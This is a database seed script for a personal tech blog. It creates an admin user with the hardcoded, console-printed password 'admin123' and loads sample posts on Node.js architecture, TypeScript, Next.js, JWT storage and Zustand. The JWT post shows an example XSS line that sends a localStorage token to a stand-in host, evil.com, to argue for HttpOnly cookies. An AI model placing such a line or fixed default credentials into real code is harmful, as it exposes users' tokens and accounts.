// ============================================================
// Seed Script — Populate database with professional posts
// ============================================================

import mongoose from 'mongoose'
import dotenv from 'dotenv'
import bcrypt from 'bcryptjs'

// Load env
dotenv.config()

// Schemas inline
const userSchema = new mongoose.Schema({
  username: { type: String, required: true, unique: true, lowercase: true },
  password: { type: String, required: true },
  role: { type: String, enum: ['admin'], default: 'admin' },
  createdAt: { type: Date, default: Date.now },
})

const postSchema = new mongoose.Schema(
  {
    title: { type: String, required: true },
    slug: { type: String, required: true, unique: true },
    content: { type: String, required: true },
    excerpt: { type: String },
    coverImage: { type: String, default: null },
    status: { type: String, enum: ['draft', 'published'], default: 'draft' },
    tags: { type: [String], default: [] },
    author: { type: mongoose.Schema.Types.ObjectId, ref: 'User' },
    publishedAt: { type: Date, default: null },
  },
  { timestamps: true }
)

const User = mongoose.model('User', userSchema)
const Post = mongoose.model('Post', postSchema)

async function seed() {
  const mongoUri = process.env.MONGO_URI!
  console.log(`🔌 Connecting to ${mongoUri}...`)
  await mongoose.connect(mongoUri)
  console.log('✅ Connected\n')

  // Clear existing data
  console.log('🧹 Cleaning existing data...')
  await User.deleteMany({})
  await Post.deleteMany({})

  // Create admin
  console.log('👤 Creating admin user...')
  const hashedPassword = await bcrypt.hash('admin123', 12)
  const admin = await User.create({
    username: 'admin',
    password: hashedPassword,
    role: 'admin',
  })
  console.log('✅ Admin created:')
  console.log('   username: admin')
  console.log('   password: admin123\n')

  // Create posts
  console.log('📝 Creating sample posts...')

  const posts = [
    {
      title: 'Clean Architecture in Node.js: Why It Matters',
      slug: 'clean-architecture-nodejs',
      content: `# Clean Architecture in Node.js: Why It Matters

When I first started writing code, my applications were one giant file. It worked, sure. But when I needed to change something, it was a nightmare.

## The Problem

Imagine you have an endpoint that creates a user. If the business logic, validation, and database call are all mixed in the same file, changing one thing breaks another.

## The Solution: Separating by Layers

Clean Architecture proposes separating code into layers with clear responsibilities:

\`\`\`
Routes → Controllers → Services → Models
\`\`\`

Each layer only knows the next one. If tomorrow I switch from MongoDB to PostgreSQL, I only modify the Models layer. The rest of the code doesn't notice.

## Practical Example

\`\`\`typescript
// Service (business logic)
class UserService {
  async create(data: CreateUserDTO): Promise<User> {
    const existing = await this.repository.findByEmail(data.email)
    if (existing) throw new ConflictError('Email already registered')
    return this.repository.create(data)
  }
}

// Controller (only translates HTTP → Service)
class UserController {
  async create(req: Request, res: Response) {
    const user = await this.service.create(req.body)
    res.status(201).json(user)
  }
}
\`\`\`

## Conclusion

It's not over-engineering. It's investing time now to save headaches later. When the project grows, those who applied Clean Architecture keep coding. Those who didn't are refactoring.

**Read about it**: "Clean Architecture" by Robert C. Martin.`,
      excerpt: "When I first started writing code, my applications were one giant file. Clean Architecture solves this by separating into layers.",
      coverImage: 'https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=1200',
      status: 'published',
      tags: ['architecture', 'nodejs', 'typescript'],
      author: admin._id,
      publishedAt: new Date('2024-01-10'),
    },
    {
      title: 'TypeScript Is Not Just "Adding Types"',
      slug: 'typescript-more-than-types',
      content: `# TypeScript Is Not Just "Adding Types"

Many developers think TypeScript is JavaScript with types. That's like saying React is just "HTML with JavaScript." It's a simplification that makes you miss the most valuable parts.

## Interfaces as Contracts

\`\`\`typescript
interface APIResponse<T> {
  data: T
  status: 'success' | 'error'
  timestamp: number
}

interface User {
  id: string
  name: string
  email: string
}
\`\`\`

Interfaces define what data you expect. If the backend changes the structure, TypeScript tells you BEFORE the code explodes in production.

## Discriminated Unions

\`\`\`typescript
type Result<T> =
  | { success: true; data: T }
  | { success: false; error: string }

function handleResult<T>(result: Result<T>) {
  if (result.success) {
    // TypeScript knows result.data exists
    console.log(result.data)
  } else {
    // TypeScript knows result.error exists
    console.error(result.error)
  }
}
\`\`\`

## Generics for Reusable Code

\`\`\`typescript
function paginate<T>(items: T[], page: number, limit: number): T[] {
  const start = (page - 1) * limit
  return items.slice(start, start + limit)
}
\`\`\`

The same function works with Users, Posts, Products, or any array.

## Conclusion

TypeScript is not bureaucracy. It's a system that detects errors at compile time instead of runtime. In a personal project that's optional. In a professional project, it's the difference between sleeping well and getting 3 AM calls.`,
      excerpt: "Many think TypeScript is JavaScript with types. That makes you miss the most valuable: interfaces, discriminated unions and generics.",
      coverImage: 'https://images.unsplash.com/photo-1516116216624-53e697fedbea?w=1200',
      status: 'published',
      tags: ['typescript', 'frontend', 'best-practices'],
      author: admin._id,
      publishedAt: new Date('2024-01-20'),
    },
    {
      title: 'Next.js App Router: SSG, ISR and Server Components',
      slug: 'nextjs-app-router',
      content: `# Next.js App Router: SSG, ISR and Server Components

When I decided to build this blog, I had several options: Hugo, Astro, WordPress, or a pure React SPA. I chose Next.js 14 with App Router. Here's why.

## The Problem with SPAs

Pure React renders everything in the browser. That means:
- The user sees a blank page while JavaScript downloads
- Google can't index your content (bad SEO)
- Poor performance on mobile

## Server Components: The Paradigm Shift

\`\`\`tsx
// This runs on the SERVER, not in the browser
export default async function HomePage() {
  const posts = await getPosts() // Direct API call
  return <PostGrid posts={posts} />
}
\`\`\`

Server Components eliminate the need for useEffect + fetch + loading states. Data arrives pre-rendered to the browser.

## SSG + ISR: The Best of Both Worlds

\`\`\`tsx
export const revalidate = 60 // Re-generates every 60 seconds
\`\`\`

- **SSG**: The page is generated once and cached. Ultra-fast.
- **ISR**: Every 60 seconds, it silently regenerates. The user always sees fresh content.

No rebuild. No deploy. No downtime.

## When NOT to Use Next.js

- Internal apps without SEO (React + Vite is enough)
- Simple static sites (Hugo or Astro are faster)
- Projects where complexity doesn't justify the benefits

## Conclusion

Next.js is not the answer for everything. But for a blog or public site where SEO matters, it's unbeatable.

**Choose the tool based on the problem, not the trend.**`,
      excerpt: "Pure React renders everything in the browser: blank page, bad SEO, poor performance. Next.js solves all of that.",
      coverImage: 'https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=1200',
      status: 'published',
      tags: ['nextjs', 'react', 'performance'],
      author: admin._id,
      publishedAt: new Date('2024-02-05'),
    },
    {
      title: 'JWT in 2025: What Tutorials Don\'t Tell You',
      slug: 'jwt-security-real-world',
      content: `# JWT in 2025: What Tutorials Don't Tell You

If you followed any JWT authentication tutorial, you probably store the token in localStorage. That was acceptable in 2018. In 2025, it's a vulnerability.

## The Problem: XSS

Any malicious script injected into your page can read localStorage:

\`\`\`javascript
// An attacker runs this on your page
const token = localStorage.getItem('jwt')
fetch('https://evil.com/steal?token=' + token)
\`\`\`

Your token gets stolen. The attacker accesses your account. End of story.

## The Solution: HttpOnly Cookies

\`\`\`typescript
res.cookie('auth_token', jwt, {
  httpOnly: true,    // JavaScript can't read it
  sameSite: 'strict', // Only sent on your domain
  secure: true,       // HTTPS only in production
  maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
})
\`\`\`

The browser stores the cookie, but JavaScript CANNOT access it. XSS loses its power.

## SameSite: The Extra Layer

\`SameSite: 'strict'\` means the cookie is only sent when navigating within your domain. An attacker trying to make a request from another site won't receive your cookie.

## Refresh Tokens: Necessary?

For a blog with 1 admin: No. A 7-day JWT is enough.
For a banking app: Yes. Short JWT (15 min) + rotating refresh tokens.

## Conclusion

Security is not optional. What you learn in YouTube tutorials has an expiration date. Research, update your practices, and don't copy code without understanding the implications.

**If your blog stores JWT in localStorage, an attacker can post in your name.**`,
      excerpt: "If you followed any JWT tutorial, you probably store the token in localStorage. In 2025, that's a vulnerability.",
      coverImage: 'https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=1200',
      status: 'published',
      tags: ['security', 'jwt', 'nodejs'],
      author: admin._id,
      publishedAt: new Date('2024-02-15'),
    },
    {
      title: 'Zustand vs Redux: Why I Chose Simplicity',
      slug: 'zustand-vs-redux',
      content: `# Zustand vs Redux: Why I Chose Simplicity

In my early projects, I used Redux. It worked, but every new feature required:
- Creating a slice
- Creating actions
- Creating reducers
- Configuring the store
- Adding the Provider to the root

That's 5 files just to manage a boolean like "isSidebarOpen."

## Zustand: State Management Without Boilerplate

\`\`\`typescript
import { create } from 'zustand'

interface AuthState {
  isAuthenticated: boolean
  username: string | null
  login: (username: string, password: string) => Promise<boolean>
  logout: () => void
}

export const useAuthStore = create<AuthState>((set) => ({
  isAuthenticated: false,
  username: null,

  login: async (username, password) => {
    const res = await fetch('/api/auth/login', {
      method: 'POST',
      body: JSON.stringify({ username, password }),
    })
    if (res.ok) {
      set({ isAuthenticated: true, username })
      return true
    }
    return false
  },

  logout: () => set({ isAuthenticated: false, username: null }),
}))
\`\`\`

One file. No Provider. No boilerplate. And it has automatic persistence:

\`\`\`typescript
export const useAuthStore = create(
  persist(
    (set) => ({ ... }),
    { name: 'auth-storage' }
  )
)
\`\`\`

## When to Use Redux

- Apps with 50+ actions and complex middleware
- Large teams that need strict conventions
- Projects already using Redux (don't migrate for fun)

## Conclusion

Redux is powerful. But for 90% of projects, Zustand is enough. Don't use an enterprise framework for an app with 3 stores.

**The best tool is the one that solves your problem without creating new ones.**`,
      excerpt: "Redux required 5 files to manage a boolean. Zustand solves the same thing in one file without boilerplate.",
      coverImage: 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=1200',
      status: 'published',
      tags: ['react', 'state-management', 'zustand'],
      author: admin._id,
      publishedAt: new Date('2024-03-01'),
    },
    {
      title: 'REST vs GraphQL: When to Use Each One',
      slug: 'rest-vs-graphql',
      content: `# REST vs GraphQL: When to Use Each One

I'm preparing an article comparing REST and GraphQL with real examples. Spoiler: there's no "better" one. It depends on the use case.

## Topics I'll Cover:

- Over-fetching and under-fetching
- Type safety in GraphQL
- REST with TypeScript DTOs
- Performance comparison
- Real-world use cases

[Article in progress]`,
      excerpt: 'Comparing REST and GraphQL with real examples. It depends on the use case.',
      coverImage: 'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=1200',
      status: 'draft',
      tags: ['api', 'backend', 'comparison'],
      author: admin._id,
    },
    {
      title: 'Docker for Development: Beyond "docker run"',
      slug: 'docker-for-development',
      content: `# Docker for Development: Beyond "docker run"

I want to write about how to use Docker effectively in local development. Not just running containers, but orchestrating your entire stack.

## Planned Topics:

- Docker Compose for full-stack apps
- Hot reload with volumes
- Networking between containers
- Multi-stage image optimization
- Windows tips (my environment)

[Draft - coming soon]`,
      excerpt: 'How to use Docker effectively in local development, beyond basic docker run.',
      coverImage: 'https://images.unsplash.com/photo-1605745341112-85968b19335b?w=1200',
      status: 'draft',
      tags: ['docker', 'devops', 'development'],
      author: admin._id,
    },
  ]

  for (const postData of posts) {
    const post = await Post.create(postData)
    const icon = post.status === 'published' ? '🟢' : '🟡'
    console.log(`${icon} "${post.title}" [${post.status}]`)
  }

  const published = posts.filter((p) => p.status === 'published').length
  const drafts = posts.filter((p) => p.status === 'draft').length

  console.log('\n🎉 Seed completed!')
  console.log(`\n📋 Summary:`)
  console.log(`   - 1 admin user (admin / admin123)`)
  console.log(`   - ${published} published posts`)
  console.log(`   - ${drafts} draft posts`)
  console.log(`\n   🌐 Blog: http://localhost:3000`)
  console.log(`   🔧 Admin: http://localhost:3000/admin/login`)

  await mongoose.disconnect()
  console.log('\n🔌 Disconnected from MongoDB')
}

seed().catch((error) => {
  console.error('❌ Seed error:', error)
  process.exit(1)
})
